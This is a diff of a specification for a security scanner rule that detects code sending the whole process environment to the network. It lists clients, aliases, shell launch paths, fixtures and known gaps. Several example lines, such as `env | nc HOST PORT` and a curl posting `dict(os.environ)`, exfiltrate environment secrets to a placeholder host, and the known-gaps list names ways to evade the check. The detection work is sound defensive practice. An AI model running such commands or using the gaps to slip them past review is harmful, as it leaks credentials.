@@ -114,28 +114,41 @@ Python: a read of the whole environment whose value reaches a network call in
 the same file. The finding is on the line of the read.
 - A whole-environment read uses `os.environ` as a whole: `dict(os.environ)`,
   `os.environ.copy()`, `.items()`, `.keys()`, `.values()`, `{**os.environ}`,
-  `json.dumps(os.environ)`, or `for name in os.environ`. After
-  `from os import environ`, `environ` counts too. A key lookup
+  `json.dumps(os.environ)`, or `for name in os.environ`. A key lookup
   (`os.environ["API_KEY"]`, `.get()`, `.pop()`, `.setdefault()`), a write, and
   a membership test (`"CI" in os.environ`) are not whole reads.
+- A name that the file imports stands for its full name: after
+  `import os as o`, `o.environ` is `os.environ`; after
+  `from os import environ as e`, `e` is `os.environ`; after
+  `import requests as r` or `from requests import post`, `r.post` and `post`
+  are `requests.post`. This applies to reads, network calls, client
+  constructors, and process launches. An import counts in the whole file, and
+  the last import of a name wins.
 - A network call is `urlopen`, `requests.<verb>`, `httpx.<verb>`,
   `aiohttp.request`, a client constructor (`requests.Session`, `httpx.Client`,
   `httpx.AsyncClient`, `aiohttp.ClientSession`, `http.client.HTTPConnection`,
-  `http.client.HTTPSConnection`, `socket.socket`, `socket.create_connection`),
-  or a send method of a name that holds a client in the same scope: an HTTP
-  verb, `request`, `putrequest`, `putheader`, `endheaders`, `send`, `sendall`,
-  `sendto`, `sendmsg`, `connect`, or `ws_connect`. The arguments `timeout`,
-  `verify`, `allow_redirects`, `follow_redirects`, `cert`, and `context` are
-  not data.
+  `http.client.HTTPSConnection`, `socket.socket`, `socket.create_connection`,
+  `smtplib.SMTP`, `smtplib.SMTP_SSL`, `smtplib.LMTP`, `ftplib.FTP`,
+  `ftplib.FTP_TLS`, `asyncio.open_connection`, `websocket.create_connection`,
+  `websocket.WebSocket`, `websockets.connect` and its `client`, `sync.client`,
+  and `asyncio.client` forms, `xmlrpc.client.ServerProxy`), or a send method
+  of a name that holds a client in the same scope: an HTTP verb, `request`,
+  `putrequest`, `putheader`, `endheaders`, `send`, `sendall`, `sendto`,
+  `sendmsg`, `connect`, `ws_connect`, `sendmail`, `send_message`, `write`,
+  `writelines`, `storbinary`, `storlines`, or `sendcmd`. Each method call on an
+  `xmlrpc.client.ServerProxy` sends. The arguments `timeout`, `verify`,
+  `allow_redirects`, `follow_redirects`, `cert`, and `context` are not data.
 - The value flows through an assignment, a loop target, a container update
-  (`append`, `extend`, `insert`, `update`, `add`, `setdefault`), a return value
-  (also read as `self.<method>()`), and an argument of a function in the file.
-  A keyword argument goes to the parameter of that name, and a positional
-  argument goes by position. A default value goes to its parameter. Functions
-  with the same name share their call arguments. A name that a function binds
-  is local to that function. `self.<name>` is shared by all methods. A key
-  lookup on a variable that holds the environment, or on a call result, reads
-  one item.
+  (`append`, `extend`, `insert`, `update`, `add`, `setdefault`, and the mail
+  message methods `set_content`, `set_payload`, `attach`, `add_attachment`), a
+  return value (also read as `self.<method>()`), and an argument of a function
+  in the file. A keyword argument goes to the parameter of that name, and a
+  positional argument goes by position. A default value goes to its parameter.
+  Functions with the same name share their call arguments. A name that a
+  function binds is local to that function. A nested function also reads the
+  locals of the functions around it, up to 100 levels, as CPython allows.
+  `self.<name>` is shared by all methods. A key lookup on a variable that holds
+  the environment, or on a call result, reads one item.
 - Strings and comments do not count. The fields of an f-string do, but a
   string inside a field does not.
 - The `env=` argument of `subprocess.run`, `subprocess.Popen`,
@@ -146,12 +159,24 @@ the same file. The finding is on the line of the read.
 - A filtered copy, such as
   `{k: v for k, v in os.environ.items() if k.startswith("APP_")}`, still
   counts. The rule cannot tell which names the filter keeps.
+- A command that Python runs in a shell is shell code, and the shell patterns
+  below apply to it. The command is the first argument, or `args=`, of
+  `os.system`, `os.popen`, `subprocess.getoutput`,
+  `subprocess.getstatusoutput`, and `asyncio.create_subprocess_shell`, and of a
+  process launch with `shell=True` or with an argument list that starts a shell
+  with `-c` (`["bash", "-c", command]`). Each string literal that reaches the
+  command, also through a variable, counts. Example:
+  `os.system("env | nc HOST PORT")`.
 - The check also reads Python inside the other file types of the rule, such as
   a shell heredoc.
-- Known gaps: aliases (`import os as o`, `from requests import post`), a
-  nested function that reads a local of its parent, Python that runs `env` in
-  a shell, and other send paths such as `smtplib` and
-  `asyncio.open_connection`.
+- Known gaps: a nested function that writes a name of its parent or of the
+  module through `nonlocal` or `global`; a local name that shadows an import; a
+  send method on a call result, such as `requests.Session().post(...)`; a
+  nested namespace of an RPC proxy, such as `proxy.system.method(...)`; Python
+  that formats the environment into a shell command, such as
+  `os.system(f"curl -d '{dict(os.environ)}' URL")`; a shell that runs on
+  another host, such as `["ssh", host, "env | curl ..."]`; and other clients,
+  such as `urllib3`.
 
 JavaScript and TypeScript: `JSON.stringify(process.env)`. Other
 serializations of `process.env` into `fetch` or `http.request`, such as
@@ -185,14 +210,21 @@ escaped one (`\$(env)`) prints as text and does not match.
 
 Malicious fixtures: `.py` files that send the whole environment with each
 listed client, directly and through variables, a return value, a method
-attribute, a function argument, and a post inside a subprocess `env=` value,
-and a shell script that sends `$(env)`. Benign fixtures: a script that
-authenticates with one named variable, gives a copy of the environment to a
-child process, sends a membership flag, posts a parameter that has the name of
-the module copy, puts the environment on a local queue named like an HTTP
-client in another function, prints the environment locally, and quotes the
-attack in a docstring; a script that posts a static JSON body; and a shell
-script that prints an example pipeline.
+attribute, a function argument, a post inside a subprocess `env=` value,
+import aliases, and a nested function that reads its parent's local; `.py`
+files that run an environment dump in a shell through `shell=True`,
+`os.system`, `os.popen`, a variable, and a `["bash", "-c", ...]` list; and a
+shell script that sends `$(env)`. Benign fixtures: a script that authenticates
+with one named variable, gives a copy of the environment to a child process,
+sends a membership flag, posts a parameter that has the name of the module
+copy, puts the environment on a local queue named like an HTTP client in
+another function, prints the environment locally, and quotes the attack in a
+docstring; a script that reads single keys through import aliases and in a
+nested function, gives the environment to child processes through aliased
+launches, greps a log for the attack text, mails and sends named values over
+RPC, and writes the environment to a local file named like a stream writer; a
+script that posts a static JSON body; and a shell script that prints an
+example pipeline.
 
 ### NET-WEBHOOK-KNOWN (Critical)
 URLs in code and markdown that deliver data to a chat webhook, a request
